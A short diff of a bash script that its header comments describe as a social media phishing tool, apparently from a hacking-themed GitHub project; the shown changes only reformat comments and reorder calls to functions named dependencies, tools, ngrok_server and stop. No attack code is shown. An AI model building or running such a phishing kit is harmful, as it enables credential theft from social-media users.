@@ -1,9 +1,8 @@
-#!/bin/bash
-## Coded : by Prince Gutierrez
-## Github : https://github.com/PDGHACK-10
-## Version : 1.0.2
-## about this tool : SOCIAL MEDIA PHISHING TOOL
-## YOUTUBE CHANNEL : PDGHACK-12
+# Coded : by Prince Gutierrez
+# Github : https://github.com/PDGHACK-10
+#Version : 1.0.2
+#about this tool : SOCIAL MEDIA PHISHING TOOL
+#YOUTUBE CHANNEL : PDGHACK-12
 blue='\033[31;1m'
 red='\033[32;1m'
 green='\033[33;1m'
@@ -252,5 +251,6 @@ done
 
 
 dependencies
-tools
 ngrok_server
+tools
+stop
